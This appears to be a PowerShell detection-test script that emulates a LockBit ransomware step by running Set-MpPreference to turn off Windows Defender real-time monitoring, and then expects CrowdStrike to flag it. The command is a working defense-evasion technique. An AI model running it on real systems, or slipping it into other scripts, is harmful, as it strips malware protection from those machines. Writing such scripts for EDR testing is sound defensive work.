<#
.SYNOPSIS
    LockBit Disable Windows Defender - DETECTION TRIGGER
.DESCRIPTION
    Disables Windows Defender real-time monitoring.
    Will trigger EDR detection for T1112/T1562.001.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1112, T1562.001
#>
Write-Host "[*] Starting LockBit Defender Disable (T1112)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for Defense Evasion" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator - some actions may fail" -ForegroundColor Red
    }
    
    Write-Host "[*] Executing: Set-MpPreference -DisableRealtimeMonitoring `$true"
    
    # ACTUAL DETECTION TRIGGER - This will be caught by EDR
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    
    Write-Host "[+] SUCCESS: Windows Defender Real-Time Monitoring DISABLED" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'DefenderControlModified' or similar" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
    Write-Host "[-] This is expected if Windows Defender is managed by Group Policy or EDR blocked it" -ForegroundColor Yellow
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
